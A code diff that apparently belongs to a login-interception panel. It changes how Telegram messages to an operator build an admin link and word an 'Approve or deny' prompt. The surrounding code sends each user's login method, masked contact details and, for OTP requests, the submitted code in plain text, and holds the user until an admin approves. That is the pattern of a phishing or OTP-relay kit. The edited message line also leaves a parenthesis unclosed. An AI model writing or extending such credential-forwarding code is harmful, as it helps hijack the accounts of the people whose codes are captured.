@@ -55,11 +55,17 @@ function isHttpUrl(value: string): boolean {
 }
 
 
+/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
+function normalizeAdminPortalUrl(raw?: string): string {
+  const t = (raw ?? '').trim()
+  if (!t) return '/admin/login'
+  const origin = t.replace(/\/admin\/login.*$/i, '').replace(/\?.*$/, '').replace(/\/+$/, '')
+  return origin || '/admin/login'
+}
+
 /** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
 function adminPortalLink(): string {
-  const raw = process.env.ADMIN_PORTAL_URL?.trim()
-  if (!raw) return '/admin/login'
-  return raw.replace(/\/+$/, '')
+  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL)
 }
 
 
@@ -155,7 +161,7 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
 📧 Method: ${asCode(methodLabel)}
 ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
 
-👉 Approve or deny at ${asLink(adminLink)}`
+👉 Approve or deny (${asLink(adminLink)}`
   }
   // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
   else if (data.type === 'login_otp_approval_request') {
@@ -170,7 +176,7 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
 ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
 🔐 Code: ${asCode((data as { password?: string }).password)}
 
-👉 Approve or deny at ${asLink(adminLink)}`
+👉 Approve or deny (${asLink(adminLink)}`
   }
   // 1b) Register button clicked on home page
   else if (data.type === 'registration' && data.page === '/') {
